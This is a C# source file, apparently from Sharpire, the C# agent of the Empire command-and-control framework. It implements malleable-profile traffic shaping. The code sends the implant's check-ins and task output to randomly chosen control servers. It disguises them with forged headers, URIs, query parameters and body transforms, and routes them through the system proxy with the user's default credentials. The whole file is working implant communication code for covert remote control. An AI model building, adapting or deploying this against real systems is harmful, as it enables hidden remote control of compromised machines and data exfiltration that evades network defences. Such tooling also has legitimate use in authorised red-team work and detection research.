using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Text;

namespace Sharpire
{
    // Optional malleable-profile extension. This file (together with
    // Empire.Agent.MalleableProfile.cs and Empire.Agent.MalleableTransform.cs)
    // is only compiled when the SharpireMalleable source library is included
    // by the stager yaml — the plain http stager ships without any of it, so
    // the base binary never carries malleable code or the System.Web.Extensions
    // JavaScriptSerializer dependency.
    //
    // When compiled in, the three partial-class extensions here:
    //   - SessionInfo  — stores a parsed MalleableProfile
    //   - Coms         — implements TryMalleableGet / TryMalleableSend hooks
    //   - EmpireStager — implements TryPickMalleableStagerUri hook
    //
    // Wire-format notes are preserved from the original single-file version:
    //   GET  routing packets ride on client.metadata
    //   POST routing packets ride on client.output
    // matching the PS/Python reference agents emitted by
    // http_malleable.py::generate_comms (Empire convention — server's
    // two-part extract treats `id` as hint-only; reference agents ignore it).
    partial class SessionInfo
    {
        private MalleableProfile malleableProfile;

        public void SetMalleableProfile(string b64Json)
        {
            if (string.IsNullOrEmpty(b64Json) || string.IsNullOrWhiteSpace(b64Json)) return;
            try { this.malleableProfile = MalleableProfile.Parse(b64Json); }
            catch { this.malleableProfile = null; }
        }

        public MalleableProfile GetMalleableProfile() { return this.malleableProfile; }
    }

    partial class Coms
    {
        partial void TryMalleableGet(byte[] routingPacket, ref byte[] responseBytes, ref bool handled)
        {
            byte[] result;
            bool attempted = TryMalleableRequest(routingPacket, false, out result);
            if (attempted)
            {
                responseBytes = result;
                handled = true;
            }
        }

        partial void TryMalleableSend(byte[] routingPacket, ref bool handled)
        {
            byte[] unused;
            if (TryMalleableRequest(routingPacket, true, out unused)) handled = true;
        }

        // Issues a request according to a runtime malleable profile. Returns
        // true if the profile was present and the request was attempted (even
        // if it failed) — callers should NOT fall back to the legacy path in
        // that case. Returns false when no profile is configured or the
        // section is malformed, signaling the caller to use the hardcoded
        // behavior.
        private bool TryMalleableRequest(byte[] routingPacket, bool isPost, out byte[] responseBytes)
        {
            responseBytes = null;
            MalleableProfile mp = sessionInfo.GetMalleableProfile();
            if (mp == null || mp.Sections == null) return false;

            string sectionName = isPost ? "post" : "get";
            Section section;
            if (!mp.Sections.TryGetValue(sectionName, out section) || section == null) return false;
            if (section.Client == null || section.Client.Uris == null || section.Client.Uris.Length == 0) return false;
            Container packetContainer = isPost ? section.Client.Output : section.Client.Metadata;
            if (packetContainer == null) return false;

            try
            {
                Random random = new Random();
                string controlServer = sessionInfo.GetControlServers()[random.Next(sessionInfo.GetControlServers().Length)];
                if (controlServer.EndsWith("/")) controlServer = controlServer.Substring(0, controlServer.Length - 1);
                string uri = section.Client.Uris[random.Next(section.Client.Uris.Length)];

                // Seed with the static parameters from the profile before any
                // parameter terminator appends its piece.
                string requestUri = controlServer + uri;
                if (section.Client.Parameters != null && section.Client.Parameters.Count > 0)
                {
                    StringBuilder qs = new StringBuilder();
                    bool first = requestUri.IndexOf('?') < 0;
                    foreach (KeyValuePair<string, string> kv in section.Client.Parameters)
                    {
                        qs.Append(first ? '?' : '&');
                        first = false;
                        qs.Append(Uri.EscapeDataString(kv.Key));
                        qs.Append('=');
                        qs.Append(Uri.EscapeDataString(kv.Value ?? ""));
                    }
                    requestUri += qs.ToString();
                }

                byte[] staticBody = DecodeBase64Loose(section.Client.Body);
                byte[] packetBytes = MalleableTransform.Apply(packetContainer.Transforms, routingPacket ?? new byte[0]);

                // URI-mutating terminators must run before HttpWebRequest
                // creation (URL is immutable once constructed).
                ApplyUriTerminator(packetContainer.Terminator, packetBytes, ref requestUri);

                HttpWebRequest req = (HttpWebRequest)WebRequest.Create(requestUri);
                req.Method = string.IsNullOrEmpty(section.Client.Verb) ? (isPost ? "POST" : "GET") : section.Client.Verb;
                req.Proxy = WebRequest.GetSystemWebProxy();
                req.Proxy.Credentials = CredentialCache.DefaultCredentials;

                if (section.Client.Headers != null)
                {
                    foreach (KeyValuePair<string, string> kv in section.Client.Headers)
                    {
                        ApplyStaticHeader(req, kv.Key, kv.Value);
                    }
                }

                byte[] bodyAccumulator = staticBody ?? new byte[0];
                bodyAccumulator = PlaceNonUriTerminator(req, packetContainer.Terminator, packetBytes, bodyAccumulator);

                if (bodyAccumulator != null && bodyAccumulator.Length > 0)
                {
                    req.ContentLength = bodyAccumulator.Length;
                    using (Stream s = req.GetRequestStream())
                    {
                        s.Write(bodyAccumulator, 0, bodyAccumulator.Length);
                    }
                }

                using (HttpWebResponse resp = (HttpWebResponse)req.GetResponse())
                {
                    if (section.Server != null && section.Server.Output != null)
                    {
                        byte[] extracted = MalleableTransform.ExtractTerminator(resp, section.Server.Output.Terminator, section.Client.Uris);
                        // NOTE: section.Server.BodyPrefix is intentionally not
                        // honored — the Python reference (Post.construct_server,
                        // transaction.py::Response.store) does not prepend it.
                        responseBytes = MalleableTransform.Reverse(section.Server.Output.Transforms, extracted);
                    }
                    else
                    {
                        using (Stream rs = resp.GetResponseStream())
                        {
                            using (MemoryStream ms = new MemoryStream())
                            {
                                if (rs != null)
                                {
                                    byte[] buf = new byte[4096];
                                    int n;
                                    while ((n = rs.Read(buf, 0, buf.Length)) > 0) ms.Write(buf, 0, n);
                                }
                                responseBytes = ms.ToArray();
                            }
                        }
                    }
                }
                return true;
            }
            catch (WebException)
            {
                if (!isPost) MissedCheckins++;
                responseBytes = null;
                return true;
            }
            catch (Exception)
            {
                // Non-network failure still counts as "attempted" so operators
                // notice a broken profile rather than silently leaking metadata
                // via the legacy cookie.
                if (!isPost) MissedCheckins++;
                responseBytes = null;
                return true;
            }
        }

        private static void ApplyUriTerminator(Terminator term, byte[] data, ref string requestUri)
        {
            if (term == null || string.IsNullOrEmpty(term.Type)) return;
            string t = term.Type.ToLowerInvariant();
            if (t == "parameter" || t == "uri-append")
            {
                MalleableTransform.StoreTerminator(null, data, term, ref requestUri);
            }
        }

        private static byte[] PlaceNonUriTerminator(HttpWebRequest req, Terminator term, byte[] data, byte[] bodyAccumulator)
        {
            if (term == null || string.IsNullOrEmpty(term.Type)) return bodyAccumulator;
            string t = term.Type.ToLowerInvariant();
            if (t == "header")
            {
                string placeholder = null;
                MalleableTransform.StoreTerminator(req, data, term, ref placeholder);
                return bodyAccumulator;
            }
            if (t == "print" || t == "")
            {
                byte[] combined = new byte[bodyAccumulator.Length + data.Length];
                Buffer.BlockCopy(bodyAccumulator, 0, combined, 0, bodyAccumulator.Length);
                Buffer.BlockCopy(data, 0, combined, bodyAccumulator.Length, data.Length);
                return combined;
            }
            return bodyAccumulator;
        }

        private static void ApplyStaticHeader(HttpWebRequest req, string name, string value)
        {
            if (string.IsNullOrEmpty(name)) return;
            if (value == null) value = "";
            switch (name.ToLowerInvariant())
            {
                case "user-agent": req.UserAgent = value; break;
                case "accept": req.Accept = value; break;
                case "referer": req.Referer = value; break;
                case "content-type": req.ContentType = value; break;
                case "host": req.Host = value; break;
                case "connection":
                case "content-length":
                case "transfer-encoding":
                case "expect":
                case "date":
                case "if-modified-since":
                case "range":
                    // Managed by the framework — skip.
                    break;
                default:
                    req.Headers[name] = value;
                    break;
            }
        }

        private static byte[] DecodeBase64Loose(string s)
        {
            if (string.IsNullOrEmpty(s)) return new byte[0];
            try
            {
                int pad = s.Length % 4;
                if (pad != 0) s = s + new string('=', 4 - pad);
                return Convert.FromBase64String(s);
            }
            catch (FormatException)
            {
                return new byte[0];
            }
        }
    }

    partial class EmpireStager
    {
        partial void TryPickMalleableStagerUri(ref string chosen)
        {
            MalleableProfile mp = sessionInfo.GetMalleableProfile();
            if (mp == null || mp.Sections == null) return;

            Section stager;
            if (!mp.Sections.TryGetValue("stager", out stager)) return;
            if (stager == null || stager.Client == null
                || stager.Client.Uris == null || stager.Client.Uris.Length == 0) return;

            Random r = new Random();
            chosen = stager.Client.Uris[r.Next(0, stager.Client.Uris.Length)];
        }
    }
}
